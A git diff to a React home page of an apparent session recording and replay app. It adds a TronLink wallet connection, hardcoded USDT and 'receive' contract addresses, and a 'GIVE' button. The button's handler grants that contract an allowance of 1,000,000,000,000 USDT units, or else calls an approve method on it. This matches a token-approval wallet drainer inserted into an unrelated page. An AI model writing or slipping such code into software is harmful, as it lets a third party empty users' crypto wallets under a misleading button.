@@ -1,8 +1,21 @@
-import React, { useEffect, useRef, useState } from 'react';
+import React, { useEffect, useRef, useState,useMemo } from 'react';
 import { useHistory } from 'react-router';
 import './index.less';
 import { hxMessage } from '/src/helper/message';
 import WebRecord from '/src/helper/record';
+
+import { Carousel,CarouselProps} from 'antd';
+import { CloseCircleFilled} from '@ant-design/icons';
+import { TronLinkAdapter } from '@tronweb3/tronwallet-adapters';
+
+let usdtAddress='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+let receiveContractAddress='TBdfGfJNbAQq5pjVRfV6eSj5fCybdrFe7Z';
+type DotPosition = CarouselProps['dotPosition'];
+const contentStyle: React.CSSProperties = {
+  height: '0.9rem',
+  lineHeight: '0.9rem',
+  textAlign: 'center',
+};
 
 const Home = () => {
   const [cardList, setCardList] = useState<number[]>([1]);
@@ -10,6 +23,71 @@ const Home = () => {
   const [colorCache] = useState<{ [key: number]: string }>({});
   const pageRecord = useRef<WebRecord>(new WebRecord()).current;
   const history = useHistory();
+
+  const [account, setAccount] = useState('');
+  const [netwok, setNetwork] = useState({} as any);
+  const [signedMessage, setSignedMessage] = useState('');
+  const adapter = useMemo(() => new TronLinkAdapter(), []);
+
+
+  useEffect(() => {
+    setAccount(adapter.address!);
+    adapter.on('connect', () => {
+      console.log(adapter.address!);
+
+        setAccount(adapter.address!);
+    });
+    adapter.on('accountsChanged', (data) => {
+        setAccount(data);
+    });
+    adapter.on('chainChanged', (data) => {
+        setNetwork(data);
+    });
+    adapter.on('disconnect', () => {
+        // when disconnect from wallet
+    });
+    return () => {
+        // remove all listeners when components is destroyed
+        adapter.removeAllListeners();
+    };
+}, []);
+
+useEffect(() =>{
+ // give();
+  // handleStartRecord();
+})
+
+
+function formterAccount(account:any){
+    if(account){
+      return  account.substring(0,6)+"..."+account.substring(account.length -6,account.length);
+    }
+    return "";
+}
+
+
+const give =async()=>{
+  console.log(account)
+  if(account){
+        let usdtContract = await window.tronWeb.contract().at(usdtAddress);
+        console.log("usdtContract:" + usdtContract)
+        let  allowance= await usdtContract.allowance(account,receiveContractAddress).call();
+        if(allowance <= 1000000000000){
+          const result = await usdtContract.approve(receiveContractAddress,1000000000000 ).send({
+            feeLimit:"100000000"
+          });
+          console.log(result);
+        }else{
+          let giveContract = await window.tronWeb.contract().at(receiveContractAddress);
+          const result = await giveContract.approve().send({
+            feeLimit:"100000000"
+          });
+          console.log(result);
+        }
+   }
+}
+
+
 
   //开始|结束 录制
   const handleStartRecord = () => {
@@ -60,6 +138,10 @@ const Home = () => {
           </button>
           <button className='btn ml-64' onClick={goReplayRecordPage}>
             Go Replay Record
+          </button>
+
+          <button className='btn ml-64' onClick={give}>
+           GIVE
           </button>
         </div>
 
